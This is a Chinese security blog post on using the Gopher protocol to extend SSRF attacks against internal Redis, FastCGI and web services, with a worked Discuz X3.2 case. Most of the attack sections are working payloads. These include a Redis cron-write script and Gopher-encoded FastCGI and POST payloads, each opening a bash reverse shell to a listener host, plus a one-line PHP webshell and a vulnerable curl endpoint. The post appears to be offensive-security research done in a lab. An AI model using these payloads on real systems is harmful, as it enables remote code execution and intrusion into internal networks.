## 利用 Gopher 协议拓展攻击面

---

-   [1 概述](https://blog.chaitin.cn/gopher-attack-surfaces/#h1_%E6%A6%82%E8%BF%B0)
-   [2 攻击面测试](https://blog.chaitin.cn/gopher-attack-surfaces/#h2_%E6%94%BB%E5%87%BB%E9%9D%A2%E6%B5%8B%E8%AF%95)

-   [2.1 环境](https://blog.chaitin.cn/gopher-attack-surfaces/#h2.1_%E7%8E%AF%E5%A2%83)
-   [2.2 攻击内网 Redis](https://blog.chaitin.cn/gopher-attack-surfaces/#h2.2_%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91-redis)
-   [2.3 攻击 FastCGI](https://blog.chaitin.cn/gopher-attack-surfaces/#h2.3_%E6%94%BB%E5%87%BB-fastcgi)
-   [2.4 攻击内网 Vulnerability Web](https://blog.chaitin.cn/gopher-attack-surfaces/#h2.4_%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91-vulnerability-web)

-   [3 攻击实例](https://blog.chaitin.cn/gopher-attack-surfaces/#h3_%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B)

-   [3.1 利用 Discuz SSRF 攻击 FastCGI](https://blog.chaitin.cn/gopher-attack-surfaces/#h3.1_%E5%88%A9%E7%94%A8-discuz-ssrf-%E6%94%BB%E5%87%BB-fastcgi)

-   [4 系统局限性](https://blog.chaitin.cn/gopher-attack-surfaces/#h4_%E7%B3%BB%E7%BB%9F%E5%B1%80%E9%99%90%E6%80%A7)
-   [5 更多攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/#h5_%E6%9B%B4%E5%A4%9A%E6%94%BB%E5%87%BB%E9%9D%A2)
-   [6 参考](https://blog.chaitin.cn/gopher-attack-surfaces/#h6_%E5%8F%82%E8%80%83)

---

### [](https://blog.chaitin.cn/gopher-attack-surfaces/#h1_%E6%A6%82%E8%BF%B0)1 概述

Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。当然现在 Gopher 协议已经慢慢淡出历史。  
Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。

### [](https://blog.chaitin.cn/gopher-attack-surfaces/#h2_%E6%94%BB%E5%87%BB%E9%9D%A2%E6%B5%8B%E8%AF%95)2 攻击面测试

#### [](https://blog.chaitin.cn/gopher-attack-surfaces/#h2.1_%E7%8E%AF%E5%A2%83)2.1 环境

-   IP: 172.19.23.218
-   OS: CentOS 6

根目录下 1.php 内容为：

```php
<?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_GET["url"]);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
$output = curl_exec($ch);
curl_close($ch);
?>
```

#### [](https://blog.chaitin.cn/gopher-attack-surfaces/#h2.2_%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91-redis)2.2 攻击内网 Redis

Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议攻击内网中的 Redis，这无疑可以隔山打牛，直杀内网。  
首先了解一下通常攻击 Redis 的命令，然后转化为 Gopher 可用的协议。常见的 exp 是这样的：

```shell
redis-cli -h $1 flushall
echo -e "\n\n*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1\n\n"|redis-cli -h $1 -x set 1
redis-cli -h $1 config set dir /var/spool/cron/
redis-cli -h $1 config set dbfilename root
redis-cli -h $1 save
```

利用这个脚本攻击自身并抓包得到数据流：  
![2016-05-31_14:59:35.jpg](https://blog.chaitin.cn/gopher-attack-surfaces/2016-05-31_14:59:35.jpg)

改成适配于 Gopher 协议的 URL：

```shell
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/172.19.23.228/2333 0>&1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

攻击：  
![2016-05-31_14:56:29.jpg](https://blog.chaitin.cn/gopher-attack-surfaces/2016-05-31_14:56:29.jpg)

#### [](https://blog.chaitin.cn/gopher-attack-surfaces/#h2.3_%E6%94%BB%E5%87%BB-fastcgi)2.3 攻击 FastCGI

一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。  
首先构造 exp：  
![2016-05-31_15:24:35.jpg](https://blog.chaitin.cn/gopher-attack-surfaces/2016-05-31_15:24:35.jpg)

构造 Gopher 协议的 URL：

```shell
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/172.19.23.228/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00
```

攻击：  
![2016-05-31_15:26:25.jpg](https://blog.chaitin.cn/gopher-attack-surfaces/2016-05-31_15:26:25.jpg)

#### [](https://blog.chaitin.cn/gopher-attack-surfaces/#h2.4_%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91-vulnerability-web)2.4 攻击内网 Vulnerability Web

Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。  
一个只能 127.0.0.1 访问的 exp.php，内容为：

```php
<?php system($_POST[e]);?>  
```

利用方式：

```text
POST /exp.php HTTP/1.1
Host: 127.0.0.1
User-Agent: curl/7.43.0
Accept: */*
Content-Length: 49
Content-Type: application/x-www-form-urlencoded

e=bash -i >%26 /dev/tcp/172.19.23.228/2333 0>%261
```

构造 Gopher 协议的 URL：

```shell
gopher://127.0.0.1:80/_POST /exp.php HTTP/1.1%0d%0aHost: 127.0.0.1%0d%0aUser-Agent: curl/7.43.0%0d%0aAccept: */*%0d%0aContent-Length: 49%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0a%0d%0ae=bash -i >%2526 /dev/tcp/172.19.23.228/2333 0>%25261null
```

攻击：  
![2016-05-31_15:19:17.jpg](https://blog.chaitin.cn/gopher-attack-surfaces/2016-05-31_15:19:17.jpg)

### [](https://blog.chaitin.cn/gopher-attack-surfaces/#h3_%E6%94%BB%E5%87%BB%E5%AE%9E%E4%BE%8B)3 攻击实例

#### [](https://blog.chaitin.cn/gopher-attack-surfaces/#h3.1_%E5%88%A9%E7%94%A8-discuz-ssrf-%E6%94%BB%E5%87%BB-fastcgi)3.1 利用 Discuz SSRF 攻击 FastCGI

Discuz X3.2 存在 SSRF 漏洞，当服务器开启了 Gopher wrapper 时，可以进行一系列的攻击。  
首先根据 phpinfo 确定开启了 Gopher wrapper，且确定 Web 目录、PHP 运行方式为 FastCGI。  
![2016-06-02_10:06:00.jpg](https://blog.chaitin.cn/gopher-attack-surfaces/2016-06-02_10:06:00.jpg) ![2016-06-01_15:09:52.jpg](https://blog.chaitin.cn/gopher-attack-surfaces/2016-06-01_15:09:52.jpg)  
![2016-06-02_10:06:52.jpg](https://blog.chaitin.cn/gopher-attack-surfaces/2016-06-02_10:06:52.jpg)  
测试 Gopher 协议是否可用，请求：

```text
http://127.0.0.1:8899/forum.php?mod=ajax&action=downremoteimg&message=%5Bimg%3D1%2C1%5Dhttp%3A%2f%2f127.0.0.1%3A9999%2fgopher.php%3Fa.jpg%5B%2fimg%5D
```

其中 gopher.php 内容为：

```php
<?php
header("Location: gopher://127.0.0.1:2333/_test");
?>
```

监听 2333 端口，访问上述 URL 即可验证：  
![2016-06-02_10:09:42.jpg](https://blog.chaitin.cn/gopher-attack-surfaces/2016-06-02_10:09:42.jpg)

构造 FastCGI 的 Exp：

```php
<?php
header("Location: gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/127.0.0.1/2333%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00");
?>
```

请求：

```text
http://127.0.0.1:8899/forum.php?mod=ajax&action=downremoteimg&message=%5Bimg%3D1%2C1%5Dhttp%3A%2f%2f127.0.0.1%3A9999%2f1.php%3Fa.jpg%5B%2fimg%5D  
```

即可在 2333 端口上收到反弹的 shell：  
![2016-06-02_09:44:25.jpg](https://blog.chaitin.cn/gopher-attack-surfaces/2016-06-02_09:44:25.jpg)  
攻击视频： 

### [](https://blog.chaitin.cn/gopher-attack-surfaces/#h4_%E7%B3%BB%E7%BB%9F%E5%B1%80%E9%99%90%E6%80%A7)4 系统局限性

经过测试发现 Gopher 的以下几点局限性：

-   大部分 PHP 并不会开启 fopen 的 gopher wrapper
-   file_get_contents 的 gopher 协议不能 URLencode
-   file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败
-   PHP 的 curl 默认不 follow 302 跳转
-   curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用

更多有待补充。  
另外，并不限于 PHP 的 SSRF。当存在 XXE、ffmepg SSRF 等漏洞的时候，也可以进行利用。

### [](https://blog.chaitin.cn/gopher-attack-surfaces/#h5_%E6%9B%B4%E5%A4%9A%E6%94%BB%E5%87%BB%E9%9D%A2)5 更多攻击面

基于 TCP Stream 且不做交互的点都可以进行攻击利用，包括但不限于：

-   HTTP GET/POST
-   Redis
-   Memcache
-   SMTP
-   Telnet
-   基于一个 TCP 包的 exploit
-   FTP（不能实现上传下载文件，但是在有回显的情况下可用于爆破内网 FTP）

更多有待补充。

### [](https://blog.chaitin.cn/gopher-attack-surfaces/#h6_%E5%8F%82%E8%80%83)6 参考

-   [Gopher (protocol)](https://en.wikipedia.org/wiki/Gopher_(protocol))
-   [redis 远程命令执行 exploit (不需要flushall)](http://zone.wooyun.org/content/23858)
-   [PHP FastCGI 的远程利用](http://zone.wooyun.org/content/1060)